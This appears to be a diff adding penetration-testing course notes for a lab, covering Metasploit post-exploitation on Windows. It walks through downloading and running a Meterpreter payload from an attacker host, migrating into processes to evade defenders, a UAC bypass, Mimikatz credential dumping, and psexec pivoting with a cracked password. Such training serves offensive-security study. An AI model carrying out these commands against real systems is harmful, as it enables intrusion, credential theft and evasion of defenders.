+ 5292   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+...
+</code></pre>
+<ul>
+<li>The proc <code>met.exe</code> has the proc ID 2012.</li>
+<li>The name and path will stand out to a reviewing defender.</li>
+</ul>
+<p>The output shows <code>offsec</code> started a proc related to OneDrive with proc ID 5292.  If our payload runs in this proc, it will be less likely to be detected by reviewing the proc list.</p>
+<p>We should be aware that we are only able to migrate into a proc that executes at the same (or lower) integrity and priv level than of our current proc.  In the context of this example, we already gained NT AUTHROTIY/SYSTEM so we have numerous choices.</p>
+<p>Let&#39;s migrate our current proc into the <code>OneDrive.exe</code> of the user <code>offsec</code> by entering <code>migrate</code> and the proc ID we want to migrate to.</p>
+<pre><code>meterpreter &gt; migrate 5292
+[*] Migrating from 2012 to 5292...
+[*] Migration completed successfully.
+meterpreter &gt; ps
+
+Process List
+============
+ PID   PPID  Name                         Arch  Session  User                Path
+ ---   ----  ----                         ----  -------  ----                ----
+...
+ 2440   668   svchost.exe
+ 2472   668   svchost.exe
+ 2496   668   svchost.exe
+ 2568   668   svchost.exe
+ 2624   668   spoolsv.exe
+ 2660   668   svchost.exe
+ 2784   668   svchost.exe
+ 2928   668   svchost.exe
+...
+</code></pre>
+<ul>
+<li>We succesfully migrated our proc to the OneDrive proc.</li>
+</ul>
+<p>When we review the proc list, our original <code>met.exe</code> proc doesn&#39;t exist anymore.  Further, we notice that <code>ps</code> output contains less info than before.  Reason being, we are now running in the context of the proc with the ID 8052 and therefore as user <code>offsec</code>.</p>
+<pre><code>meterpreter &gt; getuid
+Server username: ITWK01\offsec
+</code></pre>
+<p>Instead of migrating to an existing proc or situation in which we won&#39;t find a suitable proc for migration, we can use the <code>execute</code> Meterpreter command.  This command procides the ability to create a new proc, specifying a command or program.</p>
+<p>To demonstrate, let&#39;s start a hidden Notepad proc and migrate to it as user <code>offsec</code>.  We use <code>execute</code> with <code>-H</code> to create the proc hidden from view and <code>notepad</code> as arg for <code>-f</code> to specify the command or program to run, then migrate to the spawned proc.</p>
+<pre><code>meterpreter &gt; execute -H -f notepad
+Process 3500 created.
+meterpreter &gt; migrate 3500
+[*] Migrating from 5292 to 3500...
+[*] Migration completed successfully.
+meterpreter &gt;
+</code></pre>
+<ul>
+<li>Shows we migrated to the newly spawned Notepad proc.</li>
+<li>Spawned without GUI, <code>-H</code></li>
+<li>Still listed in the proc list.</li>
+</ul>
+<p><em>Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine&#39;s desktop in real-time.</em></p>
+<h5>Post-Exploitation Modules</h5>
+<p>In addition to the core functions of Meterpreter, there are several post modules we can deploy against an active session.</p>
+<p>Sessions created through attack vectors, the execution of a client side attck for instance, will likely only provide us with an unpriv shell.  If the target user is a member of the local admin group, we can elevate our shell to a high integrity level if we can bypass <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a>.</p>
+<p>In the previous section we migrated Meterpreter to a OneDrive.exe proc, preumably running at medium integrity.  For this section repeat the steps from the prior section and then bypass UAC with a Metasploit post module to obtain a session in the context of a high integrity level proc.</p>
+<p>We first connect to the bind shell on port 4444 of TKWK01, download <code>met.exe</code>, and enter <code>getsystem</code> to elev privs.  Then use <code>ps</code> to identify the proc ID of OneDrive.exe and <code>migrate</code> to it.</p>
+<p>Connect to bind shell and exev our binary.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ nc $IT 4444
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza&gt;powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\luiza&gt; iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
+iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
+PS C:\Users\luiza&gt; .\met.exe
+.\met.exe
+PS C:\Users\luiza&gt;
+</code></pre>
+<p>Return to our multi/handler.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://192.168.45.182:443
+[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6akQZS5QF6abQAzzv1_zbwDs87CcrIqLIzvflY5i with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
+[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Attaching orphaned/stageless session...
+[*] Meterpreter session 2 opened (192.168.45.182:443 -&gt; 192.168.226.223:52525) at 2023-11-23 12:08:20 -0800
+
+meterpreter &gt; getsystem
+[-] Error running command getsystem: Rex::TimeoutError Send timed out
+meterpreter &gt; getsystem
+[-] Already running as SYSTEM
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name           Arch  Session  User                   Path
+ ---   ----  ----           ----  -------  ----                   ----
+...
+ 7092  5292  OneDrive.exe   x64   1        ITWK01\offsec          C:\Users\offsec\AppDa
+                                                                  ta\Local\Microsoft\On
+                                                                  eDrive\OneDrive.exe
+...
+
+meterpreter &gt; migrate 7092
+[*] Migrating from 4876 to 7092...
+[*] Migration completed successfully.
+meterpreter &gt; getuid
+Server username: ITWK01\offsec
+</code></pre>
+<ul>
+<li>We are now running in the context of <code>offsec</code></li>
+</ul>
+<p>While this is an admin account, UAC prevents us from performing admin ops as we learned in prior modules.  Before attempting UAC bypass, confirm that the current proc has integrity level Medium.</p>
+<p>To diplay the integrity level of a proc, we can use tools such as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> or 3rd-party PowerShell modules such as <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.33">NtObjectManager</a>.  Assume the later is installed on the system already.</p>
+<p>Once we import the module with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2">Import-Module</a> we use <code>Get-NtTokenIntegrityLevel</code> to display the integrity level of the current proc by retrieving and reviewing the assigned access token.</p>
+<pre><code>meterpreter &gt; shell
+Process 1512 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32&gt; Import-Module NtObjectManager
+Import-Module NtObjectManager
+PS C:\Windows\system32&gt; Get-NtTokenIntegrityLevel
+Get-NtTokenIntegrityLevel
+Medium
+</code></pre>
+<ul>
+<li>We are operating in the context of integrity level Medium.</li>
+</ul>
+<p>Next we background the currently active channel and session to search for UAC post modules to leverage.</p>
+<pre><code class="language-powershell">PS C:\Windows\system32&gt; ^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; bg
+[*] Backgrounding session 2...
+</code></pre>
+<p>Search for UAC bypass modules.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; search UAC
+
+Matching Modules
+================
+
+   #   Name                                                   Disclosure Date  Rank       Check  Description
+   -   ----                                                   ---------------  ----       -----  -----------
+   0   post/windows/manage/sticky_keys                                         normal     No     Sticky Keys Persistence Module
+   1   exploit/windows/local/cve_2022_26904_superprofile      2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
+   2   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
+   3   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
+   4   exploit/windows/local/ask                              2012-01-03       excellent  No     Windows Escalate UAC Execute RunAs
+   5   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
+   6   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
+   7   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
+   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
+   9   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
+   10  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
+   11  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
+   12  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
+   13  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
+   14  post/windows/gather/win_privs                                           normal     No     Windows Gather Privileges Enumeration
+   15  exploit/windows/local/tokenmagic                       2017-05-25       excellent  Yes    Windows Privilege Escalation via TokenMagic (UAC Bypass)
+   16  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
+   17  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
+
+
+Interact with a module by name or index. For example info 17, use 17 or use exploit/windows/local/bypassuac_sluihijack
+</code></pre>
+<ul>
+<li>The search yields a few results.</li>
+<li>And effective UAC bypass on moder Win sys is <code>exploit/windows/local/bypassuac_sdclt</code></li>
+<li>Targets the MS bin <code>sdclt.exe</code></li>
+<li>Can bypass UAC by spawning a proc with integrity level High.</li>
+</ul>
+<p>To use the mod we activate it and set the <code>SESSION</code> and <code>LHOST</code> options.  Setting the SESSION for a post mod allows us to directly exec the exploit on the active session.  Enter <code>run</code> to launch the module.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_sdclt 
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; show options 
+
+Module options (exploit/windows/local/bypassuac_sdclt):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   PAYLOAD_NAME                   no        The filename to use for the payload binary
+                                            (%RAND% by default).
+   SESSION                        yes       The session to run this module on
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, proc
+                                        ess, none)
+   LHOST     192.0.2.113   yes       The listen address (an interface may be specifi
+                                        ed)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x64
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  2         meterpreter x64/windows  ITWK01\offsec @ ITWK01  192.168.45.182:443 -&gt; 192.
+                                                             168.226.223:52525 (192.168
+                                                             .226.223)
+
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; set SESSION 2
+SESSION =&gt; 2
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; set LHOST 192.168.45.182
+LHOST =&gt; 192.168.45.182
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; run
+
+[*] Started reverse TCP handler on 192.168.45.182:4444 
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[!] This exploit requires manual cleanup of &#39;C:\Users\offsec\AppData\Local\Temp\pnDeecwth.exe&#39;
+[*] Please wait for session and cleanup....
+[*] Sending stage (200774 bytes) to 192.168.226.223
+[*] Meterpreter session 3 opened (192.168.45.182:4444 -&gt; 192.168.226.223:52784) at 2023-11-23 12:57:32 -0800
+[*] Registry Changes Removed
+
+meterpreter &gt;
+</code></pre>
+<ul>
+<li>Our UAC bypass post module created a new Meterpreter session.</li>
+</ul>
+<p>Let&#39;s check the integrity level of the proc as we did before.</p>
+<pre><code>meterpreter &gt; shell
+Process 7540 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32&gt; Import-Module NtObjectManager
+Import-Module NtObjectManager
+PS C:\Windows\system32&gt; Get-NtTokenIntegrityLevel
+Get-NtTokenIntegrityLevel
+High
+</code></pre>
+<ul>
+<li>The proc of our payload runs in has the integrity level High and we have therefore bypassed UAC.</li>
+</ul>
+<p>Besides being able to BG the active session and execute module through it, we can load modules through it, we can also load extensions directly inside the active session with the <code>load</code> command.</p>
+<p>A great example is Kiwi, which is a Meterpreter extension providing Mimikatz capabilities.  Mimikatz requires SYSTEM, let&#39;s exit the current Meterpreter session, start the listener again, and exe <code>met.exe</code> as user <code>luiza</code> in the bind shell then enter <code>getsystem</code>.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://192.168.45.182:443
+[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6VIASGBxRp7RwO4XlsjMBusd6IdD5_5n82-Fzhm5 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
+[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Attaching orphaned/stageless session...
+[*] Meterpreter session 4 opened (192.168.45.182:443 -&gt; 192.168.226.223:52810) at 2023-11-23 13:05:09 -0800
+
+meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+</code></pre>
+<p>Enter <code>load</code> with <code>kiwi</code> as arg to load the Kiwi mod and use <code>help</code> to display the commands of the Kiwi module.  Use <code>creds_msv</code> to retrieve LM and NTLM creds.</p>
+<pre><code>meterpreter &gt; load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  &#39;#####&#39;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter &gt; help
+
+...
+
+
+Kiwi Commands
+=============
+
+    Command       Description
+    -------       -----------
+    creds_all     Retrieve all credentials (parsed)
+    creds_kerber  Retrieve Kerberos creds (parsed)
+    os
+    creds_livess  Retrieve Live SSP creds
+    p
+    creds_msv     Retrieve LM/NTLM creds (parsed)
+    creds_ssp     Retrieve SSP creds
+    creds_tspkg   Retrieve TsPkg creds (parsed)
+    creds_wdiges  Retrieve WDigest creds (parsed)
+    t
+    dcsync        Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticke  Create a golden kerberos ticket
+    t_create
+    kerberos_tic  List all kerberos tickets (unparsed)
+    ket_list
+    kerberos_tic  Purge any in-use kerberos tickets
+    ket_purge
+    kerberos_tic  Use a kerberos ticket
+    ket_use
+    kiwi_cmd      Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam  Dump LSA SAM (unparsed)
+    lsa_dump_sec  Dump LSA secrets (unparsed)
+    rets
+    password_cha  Change the password/hash of a user
+    nge
+    wifi_list     List wifi profiles/creds for the current user
+    wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)
+    ared
+
+meterpreter &gt; creds_msv 
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a
+                                                    0d837
+offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd
+                                                    80bbd
+</code></pre>
+<ul>
+<li>We successfully retrieve the NTLM has of <code>luiza</code></li>
+</ul>
+<h5>Pivoting with Metasploit</h5>
+<p>The ability to pivot from on target to another is vital.  In Port Redirection and Pivoting, we learned several techniques for pivoting.  Instead of perform these manually, we can also use Metasploit to perform them.</p>
+<p>As we did previously, we&#39;ll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ nc $IT 4444
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::45fb:788e:6d57:159e%11
+   IPv4 Address. . . . . . . . . . . : 192.168.247.223
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.247.254
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::70ac:1479:11e0:d2a3%14
+   IPv4 Address. . . . . . . . . . . : 172.16.132.199
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+</code></pre>
+<ul>
+<li>The second interface has IP <code>172.16.132.199</code> assigned.</li>
+</ul>
+<p>We can attempt to identify live hosts on this second iface leveraging methods from active information gathering.  Before doing so let&#39;s start a Meterpreter shell on our compromised host by downloading and executing <code>met.exe</code> as well as starting the multi/handler.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://192.168.45.182:443
+[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Redirecting stageless connection from /rFTB8XlDRXgroSqjTsA9yAxl-Rd31X4pw0cV3II1NImcjbQA7wGIuTvM4SOR3pRu_9wlTX8LwansO4JRsNRtn1YKKF9PhqUVjbcYB_or57QB7yt1T4bf2b8Au with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
+[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Attaching orphaned/stageless session...
+[*] Meterpreter session 5 opened (192.168.45.182:443 -&gt; 192.168.247.223:52558) at 2023-11-24 13:33:08 -0800
+
+meterpreter &gt;
+</code></pre>
+<p>Now that we have a session on the target sys, we can background it.  To add a route to a network reachable through a compromised host we use <code>route add</code> with the network information and session ID the route applies to.  After adding the route we can display routes with <code>route print</code>.</p>
+<pre><code>meterpreter &gt; bg
+[*] Backgrounding session 5...
+msf6 exploit(multi/handler) &gt; route add 172.16.132.0/24 5
+[*] Route added
+msf6 exploit(multi/handler) &gt; route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.16.132.0       255.255.255.0      Session 5
+
+[*] There are currently no IPv6 routes defined.
+</code></pre>
+<ul>
+<li>With a path to the internal subnet we can enumerate.</li>
+</ul>
+<p>We could scan the the whole network for live hosts with a port scan aux mod.  This would take some time to complete so we will shorted this step by scanning the only live host in the second network.  Instead of setting the value of <code>RHOSTS</code> to <code>172.16.132.0/24</code> as we would when scanning the whole network, we will set it to <code>172.16.132.200</code>.  For now we will only scan ports 445 and 3389.</p>
+<pre><code>msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 172.16.132.200
+RHOSTS =&gt; 172.16.132.200
+msf6 auxiliary(scanner/portscan/tcp) &gt; set PORTS 445,3389
+PORTS =&gt; 445,3389
+msf6 auxiliary(scanner/portscan/tcp) &gt; run
+
+[+] 172.16.132.200:       - 172.16.132.200:445 - TCP OPEN
+[+] 172.16.132.200:       - 172.16.132.200:3389 - TCP OPEN
+[*] 172.16.132.200:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<ul>
+<li>Shows that 172.16.132.200 has ports 445 and 3389 open.</li>
+<li>Let&#39;s use two mods for SMB and RDP using out pivot host ITWK01 to perform operations on the target.</li>
+</ul>
+<p>First we use psexec mod to get access to the second target as <code>luiza</code>.  Previously we retrieved NTLM hash via Kiwi, assume we cracked it and retrieved the clear text password <code>BoccieDearAeroMeow1!</code>.  For psexec to succeed <code>luiza</code> must be local admin on the second machine.  For the example, assume we confirmed that through information gathering.</p>
+<p>Let&#39;s us <code>exploit/windows/smb/psexec</code> and set <code>SMBUser</code> to <code>luiza</code>, <code>SMBPass</code> to <code>BoccieDearAeroMeow1!</code>, and <code>RHOSTS</code> to <code>172.16.132.200</code>.</p>
+<p>Note that the added route will only work with established connections, so the new shell on the target must be a bind shell such as <code>windows/x64/meterpreter/bind_tcp</code> allowing us to use the set route to connect to it.  A reverse shell payload would not be able to route back to our attacking sys because the target does not have a route defined for our network.</p>
+<pre><code>msf6 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec 
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) &gt; show options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   RHOSTS                                yes       The target host(s), see https://docs
+                                                   .metasploit.com/docs/using-metasploi
+                                                   t/basics/using-metasploit.html
+   RPORT                445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                   no        Service description to be used on ta
+                                                   rget for pretty listing
+   SERVICE_DISPLAY_NAM                   no        The service display name
+   E
+   SERVICE_NAME                          no        The service name
+   SMBDomain            .                no        The Windows domain to use for authen
+                                                   tication
+   SMBPass                               no        The password for the specified usern
+                                                   ame
+   SMBSHARE                              no        The share to connect to, can be an a
+                                                   dmin share (ADMIN$,C$,...) or a norm
+                                                   al read/write folder share
+   SMBUser                               no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, proc
+                                        ess, none)
+   LHOST     192.0.2.113   yes       The listen address (an interface may be specifi
+                                        ed)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/psexec) &gt; set SMBUser luiza
+SMBUser =&gt; luiza
+msf6 exploit(windows/smb/psexec) &gt; set SMBPass &quot;BoccieDearAeroMeow1!&quot;
+SMBPass =&gt; BoccieDearAeroMeow1!
+msf6 exploit(windows/smb/psexec) &gt; set RHOSTS 172.16.132.200
+RHOSTS =&gt; 172.16.132.200
+msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/bind_tcp
+payload =&gt; windows/x64/meterpreter/bind_tcp
+msf6 exploit(windows/smb/psexec) &gt; set LPORT 8000
+LPORT =&gt; 8000
+msf6 exploit(windows/smb/psexec) &gt; set LHOST 192.168.45.182
+LHOST =&gt; 192.168.45.182
+</code></pre>
+<p>With our options set we can launch the module.</p>
+<pre><code>msf6 exploit(windows/smb/psexec) &gt; run
+
+[*] 172.16.132.200:445 - Connecting to the server...
+[*] 172.16.132.200:445 - Authenticating to 172.16.132.200:445 as user &#39;luiza&#39;...
+[*] 172.16.132.200:445 - Selecting PowerShell target
+[*] 172.16.132.200:445 - Executing the payload...
+[+] 172.16.132.200:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Started bind TCP handler against 172.16.132.200:8000
+[*] Sending stage (200774 bytes) to 172.16.132.200
+[*] Meterpreter session 6 opened (172.16.132.199:52880 -&gt; 172.16.132.200:8000 via session 5) at 2023-11-24 14:56:33 -0800
+
+meterpreter &gt;
+</code></pre>
+<ul>
+<li>Psexec exploit succeeded in obtaining a Meterpreter shell on the second target via the compromised machine.</li>
+</ul>
+<p>An alternative to adding routes manually is to use the post mod <code>autoroute</code> to setup a pivot through an existing Meterpreter session automatically.  To demonstrate, we first need to remove the route we set manually.  Let&#39;s terminate the session created through the psexec module and remove all routes with <code>route flush</code>.</p>
+<p>Now the only session is the Meterpreter session created with <code>met.exe</code> as user <code>luiza</code>.  The result of <code>route print</code> states that no routes are defined.  Next we activate mod <code>multi/manage/autoroute</code> in which we have to set the session ID as value for the option <code>SESSION</code>, then <code>run</code> to launch the module.</p>
+<pre><code>msf6 exploit(windows/smb/psexec) &gt; use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) &gt; show options
+
+Module options (post/multi/manage/autoroute):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, au
+                                       toadd, print, delete, default)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as &quot;/24
+                                       &quot;
+   SESSION                   yes       The session to run this module on
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/manage/autoroute) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information            Connection
+  --  ----  ----                     -----------            ----------
+  5         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.45.182:443 -&gt; 192.1
+                                                            68.247.223:52558 (192.168.2
+                                                            47.223)
+
+msf6 post(multi/manage/autoroute) &gt; set session 5
+session =&gt; 5
+msf6 post(multi/manage/autoroute) &gt; run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running module against ITWK01
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.132.0/255.255.255.0 from host&#39;s routing table.
+[+] Route added to subnet 192.168.247.0/255.255.255.0 from host&#39;s routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) &gt; route print 
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.16.132.0       255.255.255.0      Session 5
+   192.168.247.0      255.255.255.0      Session 5
+
+[*] There are currently no IPv6 routes defined.
+</code></pre>
+<ul>
+<li>Shows autoroute added 172.16.132.0/24 to routing table.</li>
+</ul>
+<p>We can now use the psexec module as we did before, we can also combine routes with the <code>server/socks_proxy</code> aux mod to configure a SOCKS proxy.  This allows applications outside of MSF to tunnel through the pivot on port 1080 by default.  Set the option <code>SRVHOST</code> to <code>127.0.0.1</code> and <code>VERSION</code> to <code>5</code> for SOCKS5.</p>
+<pre><code>msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy 
+msf6 auxiliary(server/socks_proxy) &gt; show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on
+                                       . This must be an address on the local machine o
+                                       r 0.0.0.0 to listen on all addresses.
+   SRVPORT  1080             yes       The port to listen on
+   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+   When VERSION is 5:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   USERNAME                   no        Proxy username for SOCKS5 listener
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1
+SRVHOST =&gt; 127.0.0.1
+msf6 auxiliary(server/socks_proxy) &gt; set VERSION 5
+VERSION =&gt; 5
+msf6 auxiliary(server/socks_proxy) &gt; run -j
+[*] Auxiliary module running as background job 0.
+msf6 auxiliary(server/socks_proxy) &gt; 
+[*] Starting the SOCKS proxy server
+</code></pre>
+<ul>
+<li>We can now update our proxychains conf to utilize the SOCKS5 proxy.</li>
+</ul>
+<p>We can now use <code>proxychains</code> to run <code>xfreerdp</code> to obtain GUI access from our Kali sys to target on internal network.</p>
+<pre><code>### --- Increase socket timout of proxychains ---
+
+┌──(operator@labhost)-[~/OffSec/msf]
+└─$ less /etc/proxychains.conf
+
+### Some timeouts in milliseconds
+tcp_read_time_out 30000
+tcp_connect_time_out 30000
+
+### --- Proxy to internal RDP ---
+
+┌──(operator@labhost)-[~/OffSec/msf]
+└─$ sudo proxychains xfreerdp /v:172.16.128.200 /u:luiza
+</code></pre>
+<ul>
+<li>Increase socket timeout if proxy conn fails.</li>
+<li>We have successfully pivoted through compromised host.</li>
+</ul>
+<p>We can use a similar technique for port forwarding with the <code>portfwd</code> command within the Meterpreter session, which forwards a port to the internal network.</p>
